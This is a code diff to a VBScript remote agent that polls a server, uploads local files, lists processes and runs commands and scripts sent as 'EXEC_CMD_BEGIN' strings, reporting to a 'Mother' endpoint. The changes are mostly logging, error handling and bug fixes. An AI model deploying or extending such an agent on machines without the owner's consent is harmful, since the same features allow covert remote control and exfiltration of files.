@@ -158,7 +158,10 @@ Function GetProcessName(pid)
 End Function
 
 Function GetProcessList()
-    Call LogMsg("GetProcessList")
+    Dim pp : pp = "GetProcessList"
+    Err.Clear
+    
+    Call LogMsg(pp & " -- starting")
     
     Dim list : Set list = CreateObject("Scripting.Dictionary")
     
@@ -180,6 +183,15 @@ Function GetProcessList()
     Next
 
     Set GetProcessList = list
+    
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
+
 End Function
 
 Function GetTimestamp()
@@ -295,9 +307,12 @@ Function DownloadFile(sURL, headersin, sFile)
 End Function
 
 Function IsDict(objin)
+    Dim pp : pp = "IsDict"
+    Call LogMsg(pp & " -- starting")
+    
     IsDict = False
 
-    If Not headersin Is Nothing Then
+    If Not objin Is Nothing Then
         If IsObject(objin) Then
             If TypeName(objin) = "Dictionary" Then
                 If objin.Count > 0 Then
@@ -307,6 +322,12 @@ Function IsDict(objin)
         End If
     End If
     
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+    End If
+
+    Call LogMsg(pp & " -- finished")
 End Function
 
 Function UploadFile(url, localfpath)
@@ -324,6 +345,7 @@ Function UploadFile(url, localfpath)
         Exit Function
     End IF
     
+    ' anchor
     Dim fileBytes : fileBytes = ReadBinaryFile(localfpath)
     Dim totalBytes
 
@@ -350,20 +372,11 @@ Function UploadFile(url, localfpath)
 
    
     Dim headers : headers = http.GetAllResponseHeaders()
-    Dim bodyBytes : bodyBytes = http.ResponseBody
-
-    Dim adoStream : Set adoStream = CreateObject("ADODB.Stream")
-    adoStream.Type = 2 'adTypeString
-    adoStream.Charset = "utf-8"
-    adoStream.Open
-    adoStream.Write bodyBytes
-    adoStream.Position = 0
-    Dim responseString : responseString = adoStream.ReadText
-    adoStream.Close
+    Dim bodytext : bodytext = http.ResponseText
 
     Call LogMsg("http status: " & http.Status) 
     Call LogMsg("headers: " & headers)
-    Call LogMsg("response body: " & responseString)
+    Call LogMsg("response text: " & bodytext)
 
     If Err.Number <> 0 then
         Call LogMsg(pp & " -- reporting errors")
@@ -392,6 +405,8 @@ Function ReadBinaryFile(filePath)
         Exit Function
     End if
     
+    Call LogMsg(pp & " reading " & filePath)
+
     Dim stream : Set stream = CreateObject("ADODB.Stream")
     
     stream.Type = 1 ' adTypeBinary
@@ -2186,10 +2201,11 @@ Function StopPCMon()
 End Function
 
 Function LaunchExecCmd(argstr)
+    Dim pp : pp = "LaunchExecCmd"
     LaunchExecCmd = -1
     
     ' EXEC_CMD_BEGIN|<cmdname>|arg1|arg2|...|argn|EXEC_CMD_END
-    Call LogMsg("LaunchExecCmd: " & argstr)
+    Call LogMsg(pp & ": " & argstr)
     
     Dim argarr
     
@@ -2212,7 +2228,7 @@ Function LaunchExecCmd(argstr)
 
     Dim argarrlen : argarrlen = UBound(argarr) + 1
     
-    Call LogMsg("LaunchExecCmd -- arg count=" & CStr(argarrlen))
+    Call LogMsg(pp & " -- arg count=" & CStr(argarrlen))
 
     If ( argarrlen <= 0 ) Then 
         Call LogMsg("LaunchExecCmd -- ERROR :: cmdname not set -- exiting function")
@@ -2241,7 +2257,7 @@ Function LaunchExecCmd(argstr)
     End If
 
     
-    Call LogMsg("LaunchExecCmd -- starting exec_cmdname=" & exec_cmdname)
+    Call LogMsg(pp & " -- starting exec_cmdname=" & exec_cmdname)
 
     If ( ( LCase(exec_cmdname) = LCase("LogMsgMother") ) and ( argarrlen >= 1 ) ) Then
         Call PushEventMother("job_started")
@@ -2269,11 +2285,24 @@ Function LaunchExecCmd(argstr)
     
     End If
     
-    Call LogErr()
-    Call LogMsg("LaunchExecCmd finished")
+    If ( LCase(exec_cmdname) = LCase("GetProcList") ) Then
+        Call PushEventMother("start_job")
+
+        Call GetProcList()
+        
+        LaunchExecCmd = 0    
+    End If
+
+    If Err.Number <> 0 Then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
     
     Call PushEventMother("job_finished")
 
+    Call LogMsg(pp & " finished")
+    
 End Function
 
 Function LaunchExecScript(scripttext,ext)
@@ -2492,7 +2521,7 @@ Function Ping()
         Dim isvalid : isvalid = false
         Dim pingtxt
         
-        isvalid = DownloadFile(url & "?" & dparams, pingpath, nothing)
+        isvalid = DownloadFile(url & "?" & dparams, nothing, pingpath)
         
         if isvalid then
             Call LogMsg("DownloadFile was successful, validating the output")
@@ -3356,18 +3385,22 @@ Function GetProcList()
     
     Call LogMsg(pp & " -- starting")
     
-    Dim proclist : proclist = GetProcessList()
-    
+    Dim proclist : Set proclist = GetProcessList()
+        
     If Not IsDict(proclist) then
-        Call LogMsg(pp & " proclist is not a valid dict -- exiting function")
+        Call LogMsg(pp & " -- proclist is not a valid dict -- exiting function")
         exit function
+    Else
+        Call LogMsg(pp & " -- proclist is valid")
     End if
     
     Dim outstr : outstr = ""
     
     Dim kkey 
     For Each kkey In proclist
-        Dim linestr : linestr = "[" & kkey & "]=[" & proclist(kkey) & "]"
+        Dim valuearr : valuearr = proclist.Item(kkey)
+        Dim valuestr : valuestr = Join(valuearr, "|")
+        Dim linestr : linestr = "[" & kkey & "]=[" & valuestr & "]"
         
         Call LogMsg(linestr)
         
